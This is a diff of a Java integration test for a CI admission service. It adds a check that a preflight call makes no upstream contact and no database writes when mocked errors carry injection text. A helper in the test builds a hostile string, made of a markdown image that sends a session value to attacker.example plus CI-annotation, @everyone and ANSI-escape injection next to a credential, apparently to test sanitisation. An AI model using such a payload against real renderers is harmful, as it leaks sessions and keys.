@@ -31,6 +31,7 @@ class CiAdmissionIT extends MariaDbReportFixture {
     private AccountLifecycleIT.MutableClock clock;private AccountDao dao;private AccountSessionService sessions;
     private CiTargetsService targets;private CiKeysService keys;private CiAdmissionService ci;private CiRateService rates;
     private DiscoveryTransport transport;private AuditRunDao runDao;private long owner;private String browser,target;
+    private HttpsTargetProofClient proof;
     private CiKeysService.Issued key;private com.typesafe.config.Config config;
     @BeforeEach void setupCiAdmission() throws Exception {
         clock=new AccountLifecycleIT.MutableClock();clock.now=Instant.parse("2026-10-18T12:00:00Z");
@@ -39,7 +40,7 @@ class CiAdmissionIT extends MariaDbReportFixture {
         var settings=new AccountSettings(config);sessions=new AccountSessionService(dao,new AccountSessionSigner(settings,mapper,clock),tokens,settings,clock);
         var policy=new CiPolicy(config);var usage=new UsageService(tx,new UsagePolicy(config),clock);var entitlement=new CiEntitlementService(policy,usage,clock);
         var operations=new CiAccountOperations(sessions,new AccountRateLimiter(dao,tokens,clock,settings),entitlement);
-        var proof=mock(HttpsTargetProofClient.class);when(proof.matches(anyString(),anyString(),any())).thenReturn(true);
+        proof=mock(HttpsTargetProofClient.class);when(proof.matches(anyString(),anyString(),any())).thenReturn(true);
         targets=new CiTargetsService(dao,operations,policy,entitlement,proof,tokens,clock);
         keys=new CiKeysService(dao,operations,targets,policy,new CiAuthLimiter(dao,tokens,clock),sessions,tokens,mapper,clock);
         owner=user("admission@example.com");browser=login(owner);target=verified(browser);
@@ -61,6 +62,22 @@ class CiAdmissionIT extends MariaDbReportFixture {
     private CiErrorCode code(WebApplicationException e){return ((CiErrors.Envelope)e.getResponse().getEntity()).error().code();}
     private CiAdmissionService.Creation admit(String intention,int count){return ci.create(auth(),"fixture",intention,input(count));}
     private long runId(CiAdmissionService.Creation created){return Long.parseLong(created.admission().runs().getFirst().id());}
+    @Test void doctorPreflightCannotResolveContactVerifyOrAdmitATargetEvenWithHostileUpstreamErrors() {
+        clearInvocations(proof,transport);
+        doThrow(new RuntimeException("synthetic-private-737 ::error:: @everyone")).when(transport).validate(anyString(),any());
+        doThrow(new RuntimeException("synthetic-private-737")).when(proof).matches(anyString(),anyString(),any());
+        var before=ci.usage(auth(),"fixture").usage();
+        var audit=QAudit.audit;var run=QAuditRun.auditRun;
+        long audits=dao.transactions.selectQuery().select(audit.id.count()).from(audit).fetchOne();
+        long runsBefore=dao.transactions.selectQuery().select(run.id.count()).from(run).fetchOne();
+        var value=ci.preflight(auth(),"fixture");
+        assertTrue(value.newAccessAllowed());assertEquals(before,value.usage());
+        assertEquals(audits,dao.transactions.selectQuery().select(audit.id.count()).from(audit).fetchOne());
+        assertEquals(runsBefore,dao.transactions.selectQuery().select(run.id.count()).from(run).fetchOne());
+        assertEquals(0L,dao.transactions.selectQuery().select(QCiRequest.table.id.count()).from(QCiRequest.table).fetchOne());
+        assertEquals(0L,dao.transactions.selectQuery().select(QUsageRun.table.id.count()).from(QUsageRun.table).fetchOne());
+        verifyNoInteractions(proof,transport);
+    }
     private String hostile(){return "synthetic-private-736 @everyone ::error:: ![remote](https://attacker.example/private?session=hidden) \u001b[31m "+key.credential();}
     private long publishPrivate() throws Exception {
         long run=runId(admit(UUID.randomUUID().toString(),1));
